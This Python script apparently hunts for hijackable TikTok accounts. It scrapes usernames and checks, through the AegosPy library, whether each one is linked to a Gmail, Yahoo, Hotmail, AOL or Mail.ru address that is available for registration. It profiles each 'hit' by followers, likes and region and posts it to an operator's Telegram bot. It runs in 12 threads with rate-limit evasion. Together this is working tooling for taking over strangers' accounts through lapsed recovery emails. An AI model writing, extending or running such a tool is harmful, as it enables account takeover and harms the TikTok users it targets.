#!/usr/bin/env python3

"""
TikTok Email Checker v3 - Lightweight Edition
Minimal dependencies, fast execution, focused on short usernames.
"""

import time
import requests
import random
import os
import json
import sys
from user_agent import generate_user_agent
from threading import Thread, Lock
from AegosPy import *

# Colors
R='\033[1;31;40m'; X='\033[1;33;40m'; F='\033[1;32;40m'; C='\033[1;97;40m'
B='\033[1;36;40m'; G='\033[1;32m'; Y='\033[1;33m'; V='\033[1;36;40m'

# Stats
hits = {'ok':0, 'hit':0, 'bad_email':0, 'bad_tik':0}
lk = Lock()

# Telegram
try:
    TG_ID = input(f'{F}ID : ')
    TG_TOK = input(f'{F}Token : ')
except:
    TG_ID, TG_TOK = "YOUR_ID", "YOUR_TOKEN"


def send(text):
    try:
        requests.post(f"https://api.telegram.org/bot{TG_TOK}/sendMessage",
                      data={"chat_id":TG_ID,"text":text,"parse_mode":"HTML"}, timeout=8)
    except:
        pass


def check(user, dom):
    """Fast single check."""
    email = f"{user}@{dom}"

    with lk:
        print(f'{Y}[*]{email}', end='\r')

    # TikTok check
    try:
        r = AegosPy.CheckTik(email)
    except:
        with lk: hits['bad_tik'] += 1
        return

    if not r or r.get("Status") != "OK":
        with lk: hits['bad_tik'] += 1
        return

    with lk: hits['ok'] += 1

    # Domain check
    checks = {
        'gmail.com': AegosPy.A_Gmail,
        'yahoo.com': AegosPy.A_Yahoo,
        'hotmail.com': AegosPy.A_Hotmail,
        'aol.com': AegosPy.A_Aol,
        'mail.ru': AegosPy.A_MailRu,
    }

    fn = checks.get(dom)
    if not fn:
        return

    try:
        er = fn(email)
    except:
        return

    if er and er.get("Status") == "Available":
        with lk:
            hits['hit'] += 1
            print(f'\n{G}[!!!] HIT: {email}')

        try:
            info = AegosPy.GetInfoTik(user)
        except:
            info = {}

        msg = (f"<b>HIT</b>\n"
               f"User: {user}\n"
               f"Email: {email}\n"
               f"ID: {info.get('id','?')}\n"
               f"Name: {info.get('name','?')}\n"
               f"Foll: {info.get('followers','?')}\n"
               f"Likes: {info.get('likes','?')}\n"
               f"Reg: {info.get('code-country','?')}\n"
               f"<b>@bsx_h2</b>")
        send(msg)
    else:
        with lk: hits['bad_email'] += 1


def run():
    """Search + check loop."""
    hdrs = {"User-Agent": generate_user_agent(), "Accept": "application/json"}

    chars = 'qwertyuiopasdfghjklzxcvbnm'
    doms = ['gmail.com','yahoo.com','hotmail.com','aol.com','mail.ru']

    while True:
        try:
            # Weighted: 4-7 chars = best results
            length = random.choices([3,4,5,6,7,8],[0.10,0.30,0.30,0.15,0.10,0.05], k=1)[0]
            kw = "".join(random.choice(chars) for _ in range(length))

            url = f'https://livecounts.xyz/api/tiktok-live-follower-count/search/{kw}'
            resp = requests.get(url, headers=hdrs, timeout=12)

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if data and data.get('success') and 'results' in data:
                        res = data['results']
                        random.shuffle(res)
                        n = 0
                        for u in res:
                            if n >= 12: break
                            name = u.get('username','')
                            if not name or len(name) < 3 or len(name) > 30:
                                continue
                            if name.isdigit(): continue
                            for d in doms:
                                check(name, d)
                                time.sleep(0.2)
                                n += 1
                                if n >= 12: break
                    else:
                        time.sleep(1)
                except:
                    time.sleep(2)
            elif resp.status_code in (403, 429):
                time.sleep(30)
            else:
                time.sleep(3)
        except:
            time.sleep(3)

        time.sleep(random.uniform(0.5, 2))


if __name__ == '__main__':
    os.system('clear')
    print(f"{X}[{F}✓{X}]{C} TikTok Checker v3 Lite")
    print(f"{G}[+] Short usernames 2-6 chars")
    print(f"{G}[+] 5 domains | 12 threads")
    time.sleep(1)

    for _ in range(12):
        Thread(target=run, daemon=True).start()

    print(f"{G}[+] Running...{C}")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{X}Exit{C}")
